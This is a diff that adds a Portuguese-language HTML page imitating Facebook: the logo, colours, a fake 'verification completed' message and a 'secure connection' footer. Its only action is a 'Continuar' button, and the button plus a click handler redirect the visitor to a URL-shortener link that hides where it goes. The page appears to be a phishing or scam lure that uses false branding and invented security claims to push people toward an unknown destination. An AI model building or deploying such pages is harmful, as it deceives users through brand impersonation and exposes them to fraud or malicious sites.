@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Verificação de Acesso</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #18191a;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .fb-card {
+      max-width: 500px;
+      width: 100%;
+      background: #242526;
+      border-radius: 24px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
+      overflow: hidden;
+    }
+
+    .fb-header {
+      background: linear-gradient(135deg, #0866ff 0%, #1877f2 60%, #0a5bd4 100%);
+      padding: 24px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .fb-header::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse at 30% 50%, rgba(255,255,255,0.12) 0%, transparent 70%);
+    }
+
+    .fb-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: #ffffff;
+      font-weight: 800;
+      font-size: 28px;
+      letter-spacing: -0.5px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .fb-logo svg {
+      width: 36px;
+      height: 36px;
+    }
+
+    .fb-body {
+      padding: 36px 28px 40px;
+      text-align: center;
+    }
+
+    .check-icon {
+      background: linear-gradient(135deg, #1877f2, #0866ff);
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+      box-shadow: 0 8px 24px rgba(24, 119, 242, 0.45);
+    }
+
+    .check-icon svg {
+      width: 38px;
+      height: 38px;
+      stroke: white;
+      stroke-width: 2.5;
+    }
+
+    h2 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #e4e6eb;
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .desc {
+      font-size: 16px;
+      line-height: 1.55;
+      color: #b0b3b8;
+      margin-bottom: 32px;
+    }
+
+    .fb-btn {
+      display: inline-block;
+      background: linear-gradient(135deg, #1877f2, #0866ff);
+      color: white;
+      font-weight: 700;
+      font-size: 17px;
+      padding: 14px 28px;
+      border-radius: 40px;
+      text-decoration: none;
+      width: 100%;
+      max-width: 280px;
+      text-align: center;
+      transition: 0.2s;
+      box-shadow: 0 4px 18px rgba(24, 119, 242, 0.45);
+      border: none;
+      cursor: pointer;
+    }
+
+    .fb-btn:hover {
+      transform: scale(1.02);
+      box-shadow: 0 6px 24px rgba(24, 119, 242, 0.6);
+    }
+
+    .fb-btn:active {
+      transform: scale(0.98);
+    }
+
+    .fb-footer {
+      background: #18191a;
+      padding: 14px 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #6c6c6c;
+      border-top: 1px solid #3a3b3c;
+    }
+
+    @media (max-width: 520px) {
+      .fb-body { padding: 28px 20px 32px; }
+      h2 { font-size: 22px; }
+      .desc { font-size: 14px; }
+      .fb-btn { font-size: 16px; padding: 12px 20px; }
+      .fb-header { padding: 18px 20px; }
+      .fb-logo { font-size: 24px; }
+      .fb-logo svg { width: 30px; height: 30px; }
+      .check-icon { width: 60px; height: 60px; }
+      .check-icon svg { width: 30px; height: 30px; }
+    }
+
+    @media (max-width: 420px) {
+      .fb-body { padding: 24px 16px 28px; }
+      .check-icon { width: 52px; height: 52px; }
+      .check-icon svg { width: 26px; height: 26px; }
+    }
+
+    a { text-decoration: none; }
+  </style>
+</head>
+<body>
+
+<div class="fb-card">
+  <div class="fb-header">
+    <div class="fb-logo">
+      <svg viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+        <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.874v2.25h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+      </svg>
+      <span>Facebook</span>
+    </div>
+  </div>
+
+  <div class="fb-body">
+    <div class="check-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"></polyline>
+      </svg>
+    </div>
+    <h2>Verificação concluída</h2>
+    <p class="desc">
+      Seu acesso foi validado com sucesso.<br>
+      Clique no botão abaixo para seguir para o próximo passo.
+    </p>
+    <a href="https://gqr.sh/nELd" class="fb-btn" id="continueBtn">Continuar →</a>
+  </div>
+
+  <div class="fb-footer">
+    🔒 Conexão segura • Verificação em tempo real
+  </div>
+</div>
+
+<script>
+  document.getElementById('continueBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    window.location.href = 'https://gqr.sh/nELd';
+  });
+</script>
+</body>
+</html>
